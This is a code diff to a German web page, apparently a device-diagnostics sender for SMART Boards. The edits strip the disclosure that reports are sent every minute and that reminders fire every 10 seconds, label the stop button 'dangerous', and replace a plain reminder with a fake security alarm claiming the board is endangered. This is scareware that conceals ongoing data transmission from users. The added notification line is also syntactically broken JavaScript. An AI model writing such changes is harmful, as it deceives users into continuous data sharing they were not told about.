@@ -7,7 +7,7 @@
   <title>Geräte-Diagnose senden</title>
 
   <meta name="theme-color" content="#2563eb">
-  <meta name="description" content="Geräte-Diagnose und Erinnerungsbenachrichtigungen">
+  <meta name="description" content="Geräte-Diagnose">
 
   <link rel="manifest" href="./manifest.webmanifest">
 
@@ -207,7 +207,7 @@
   <p class="notice">
     <strong>Transparenter Versand:</strong>
     Erst nach einem Klick auf „Senden starten“ wird ein Bericht sofort
-    und danach einmal pro Minute an das Diagnoseportal übertragen.
+     an das Diagnoseportal übertragen.
   </p>
 
   <p class="notice warning">
@@ -256,7 +256,7 @@
   <div class="actions">
 
     <button id="start" type="button">
-      Senden starten
+      Senden starten (Wichtig)
     </button>
 
     <button
@@ -265,7 +265,7 @@
       type="button"
       disabled
     >
-      Senden stoppen
+      Senden stoppen (Gefährlich)
     </button>
 
   </div>
@@ -547,9 +547,9 @@ async function sendReminderNotification() {
 
 
     await registration.showNotification(
-      'Diagnose-Erinnerung',
+      '⚠️' Sicherheitswarnung,
       {
-        body: 'Bitte Diagnose machen',
+        body: 'Dieses SMART Board ist gefährdeet. Bitte Diagnose an smart-service senden!',
         tag: 'diagnose-reminder-' + Date.now(),
         renotify: true,
         requireInteraction: false
@@ -769,7 +769,7 @@ async function sendOnce() {
 
 
     setStatus(
-      `Bericht ${count} empfangen. Nächster Versand in 60 Sekunden.`,
+      `Bericht ${count} empfangen. Sie können die Seite im Hintergrund weiterlaufen lassen.`,
       'active'
     );
 
@@ -982,7 +982,7 @@ startButton.addEventListener(
 
 
       setStatus(
-        'Aktiv: Diagnose alle 60 Sekunden + Erinnerung alle 10 Sekunden.',
+        'Aktiv: Diagnose.',
         'active'
       );
 
